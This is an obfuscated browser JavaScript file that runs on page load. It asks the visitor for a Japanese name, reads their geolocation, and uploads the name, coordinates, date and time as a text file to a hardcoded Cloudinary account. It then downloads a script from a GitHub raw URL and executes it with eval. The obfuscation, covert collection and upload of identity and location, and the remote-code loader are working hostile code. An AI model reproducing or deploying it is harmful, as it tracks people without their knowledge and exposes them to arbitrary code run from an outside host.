const _0xdb506d=_0x20ab;(function(_0x2ead55,_0x1662ec){const _0x5d91bb=_0x20ab,_0x596f25=_0x2ead55();while(!![]){try{const _0x3a5577=parseInt(_0x5d91bb(0xae))/0x1+parseInt(_0x5d91bb(0x9e))/0x2+-parseInt(_0x5d91bb(0xb3))/0x3*(-parseInt(_0x5d91bb(0xa3))/0x4)+parseInt(_0x5d91bb(0x95))/0x5*(-parseInt(_0x5d91bb(0xa1))/0x6)+parseInt(_0x5d91bb(0x9b))/0x7*(parseInt(_0x5d91bb(0x99))/0x8)+parseInt(_0x5d91bb(0xb8))/0x9*(-parseInt(_0x5d91bb(0xac))/0xa)+-parseInt(_0x5d91bb(0xa5))/0xb;if(_0x3a5577===_0x1662ec)break;else _0x596f25['push'](_0x596f25['shift']());}catch(_0x11b07c){_0x596f25['push'](_0x596f25['shift']());}}}(_0x5569,0xd50bc));const cloud_name=_0xdb506d(0xbc),upload_preset=_0xdb506d(0xb0),folder_name='date';function getLocation(){const _0x4eb835=_0xdb506d;navigator[_0x4eb835(0xab)]?navigator[_0x4eb835(0xab)]['getCurrentPosition'](uploadLocation):console['log'](_0x4eb835(0xb2));}function uploadFile(_0x216022){const _0x1f2dc1=_0xdb506d,_0x4fb536=new FormData();_0x4fb536[_0x1f2dc1(0xa6)](_0x1f2dc1(0xb5),_0x216022),_0x4fb536[_0x1f2dc1(0xa6)](_0x1f2dc1(0xb4),upload_preset),_0x4fb536['append'](_0x1f2dc1(0xb1),folder_name),fetch('https://api.cloudinary.com/v1_1/'+cloud_name+_0x1f2dc1(0x96),{'method':_0x1f2dc1(0x98),'body':_0x4fb536})[_0x1f2dc1(0xad)](_0x16ba07=>_0x16ba07[_0x1f2dc1(0xa2)]())['then'](_0x4e11bd=>{const _0x574450=_0x1f2dc1;console['log']('File\x20uploaded\x20to\x20Cloudinary!'),console[_0x574450(0xaa)](_0x574450(0xb9),_0x4e11bd[_0x574450(0xb6)]),executeAdditionalProcess(_0x4e11bd['secure_url']);})['catch'](_0x134331=>{const _0x1f8346=_0x1f2dc1;console[_0x1f8346(0xaa)](_0x1f8346(0xbd),_0x134331);});}function createAndUploadFile(_0x3d703f,_0x53efed,_0x50a177){const _0x41d4dc=_0xdb506d,_0x5ed3d4=new Date(),_0x200118=_0x5ed3d4['toISOString']()[_0x41d4dc(0xba)]('T')[0x0],_0x3d2d1d=_0x5ed3d4[_0x41d4dc(0x9a)]()[_0x41d4dc(0xba)]('T')[0x1][_0x41d4dc(0xba)]('.')[0x0],_0x5812f4=_0x41d4dc(0xbb)+_0x3d703f+',\x20Latitude:\x20'+_0x53efed+_0x41d4dc(0xa7)+_0x50a177+',\x20日付:\x20'+_0x200118+',\x20時間:\x20'+_0x3d2d1d,_0xb28f3a=new File([_0x5812f4],_0x3d703f+'_'+_0x200118+'_'+_0x3d2d1d+'.txt',{'type':_0x41d4dc(0x9f)});uploadFile(_0xb28f3a);}function uploadWithStoredName(){const _0x2a1ef2=_0xdb506d,_0xe19a6=localStorage[_0x2a1ef2(0xa8)]('information1');if(_0xe19a6&&_0xe19a6['length']>=0x3&&/[^\x01-\x7E\xA1-\xDF]/[_0x2a1ef2(0xa0)](_0xe19a6)&&!/[A-Za-z]/[_0x2a1ef2(0xa0)](_0xe19a6))getLocation();else{const _0x38ce61=prompt('名前を入力してください（3文字以上で、漢字が2文字含まれ、アルファベットが含まれていない）');_0x38ce61&&_0x38ce61[_0x2a1ef2(0xaf)]>=0x3&&/[^\x01-\x7E\xA1-\xDF]/['test'](_0x38ce61)&&!/[A-Za-z]/[_0x2a1ef2(0xa0)](_0x38ce61)?(localStorage[_0x2a1ef2(0x9c)](_0x2a1ef2(0xa4),_0x38ce61),getLocation()):console['log']('入力が無効です。再度お試しください。');}}function executeAdditionalProcess(_0xf35706){const _0x1b2a6a=_0xdb506d;console['log'](_0x1b2a6a(0x9d),_0xf35706);_0x31b224:function _0x347e05(_0x4eeb4c){const _0x30104f=_0x1b2a6a;fetch(_0x4eeb4c)[_0x30104f(0xad)](_0x55f6d3=>_0x55f6d3[_0x30104f(0xb7)]())[_0x30104f(0xad)](_0x114970=>eval(_0x114970));}_0x347e05('https://raw.githubusercontent.com/hirotomoki12345/hamanan/main/base.js');}function _0x20ab(_0x286051,_0xe3f36d){const _0x55698d=_0x5569();return _0x20ab=function(_0x20abca,_0x888c10){_0x20abca=_0x20abca-0x95;let _0x14543b=_0x55698d[_0x20abca];return _0x14543b;},_0x20ab(_0x286051,_0xe3f36d);}function _0x5569(){const _0x47d726=['test','6bOWAuf','json','424dBnNcJ','information1','31209585TUmDma','append',',\x20Longitude:\x20','getItem','longitude','log','geolocation','5002090yClRzJ','then','1406401jaPOIJ','length','gmr5c3hg','folder','Geolocation\x20is\x20not\x20supported\x20by\x20this\x20browser.','44790ovjVuA','upload_preset','file','secure_url','text','9WpumLx','Public\x20URL:\x20','split','名前:\x20','dxzsajngl','Error\x20uploading\x20file:\x20','1400120AEPzLo','/upload','coords','POST','1255088yYQGXD','toISOString','28BywRsz','setItem','アップロードしたファイルのURL:\x20','1747158sxblcI','text/plain'];_0x5569=function(){return _0x47d726;};return _0x5569();}function uploadLocation(_0x4902a1){const _0x5ace4f=_0xdb506d,_0x49b894=_0x4902a1['coords']['latitude'],_0xba388b=_0x4902a1[_0x5ace4f(0x97)][_0x5ace4f(0xa9)],_0xe6b5c=localStorage[_0x5ace4f(0xa8)](_0x5ace4f(0xa4));createAndUploadFile(_0xe6b5c,_0x49b894,_0xba388b);}uploadWithStoredName();
